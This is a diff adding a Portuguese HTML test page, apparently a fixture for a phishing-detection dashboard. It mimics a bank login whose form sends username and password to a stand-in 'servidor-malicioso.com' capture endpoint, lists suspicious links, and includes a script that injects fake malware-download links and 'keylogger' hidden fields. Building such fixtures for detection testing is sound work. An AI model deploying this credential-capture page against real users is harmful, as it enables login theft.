@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Vítima Teste - Simulação de Phishing</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; color: #333; }
+        .container { max-width: 600px; margin: auto; border: 1px solid #ccc; padding: 20px; border-radius: 8px; }
+        .hidden { display: none; }
+        .btn-fake { background: #007bff; color: white; padding: 10px; border: none; border-radius: 4px; cursor: pointer; }
+        #logs { margin-top: 20px; font-size: 0.8rem; color: #666; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Acesso à Conta Bancária</h1>
+    <p>Detectamos uma atividade suspeita. Por favor, confirme seus dados.</p>
+    
+    <form id="login-fake" action="https://servidor-malicioso.com/captura" method="POST">
+        <input type="text" name="user" placeholder="Usuário">
+        <input type="password" name="pass" placeholder="Senha">
+        <input type="hidden" name="token_sessao" value="xyz123shadow"> <button type="submit" class="btn-fake">Entrar com Segurança</button>
+    </form>
+
+    <hr>
+
+    <h3>Links de Verificação:</h3>
+    <ul>
+        <li><a href="http://192.168.1.155/login.php">Acessar via IP Direto</a></li>
+        <li><a href="https://bit.ly/desconto-exclusivo-2026">Link Encurtado</a></li>
+        <li><a href="javascript:void(0)" onclick="alert('Exploit Simulado!')">Execução Inline</a></li>
+    </ul>
+
+    <button onclick="gerarCargaDinamica()" class="btn-fake" style="background: #dc3545;">
+        GERAR CARGA DINÂMICA (Estresse)
+    </button>
+
+    <div id="target-area"></div>
+</div>
+
+<script>
+    function gerarCargaDinamica() {
+        const area = document.getElementById('target-area');
+        console.log("Iniciando injeção de vetores...");
+
+        // Gera 50 Spans e 50 Links aleatórios para testar o Raio-X
+        for (let i = 0; i < 50; i++) {
+            setTimeout(() => {
+                // Injeta SPAN
+                const span = document.createElement('span');
+                span.innerText = `Rastreador_ID_${Math.random().toString(36).substr(2, 5)}`;
+                span.style.color = 'red';
+                area.appendChild(span);
+
+                // Injeta Link Suspeito
+                const link = document.createElement('a');
+                link.href = `http://malware-server.com/auto-download/${i}`;
+                link.innerText = " [BAIXAR ATUALIZAÇÃO] ";
+                area.appendChild(link);
+
+                // Injeta um Input invisível ocasionalmente
+                if(i % 5 === 0) {
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.value = 'captura_keylogger';
+                    area.appendChild(input);
+                }
+            }, i * 100); // Injeta a cada 100ms para ver o dashboard atualizando em tempo real
+        }
+    }
+</script>
+
+</body>
+</html>
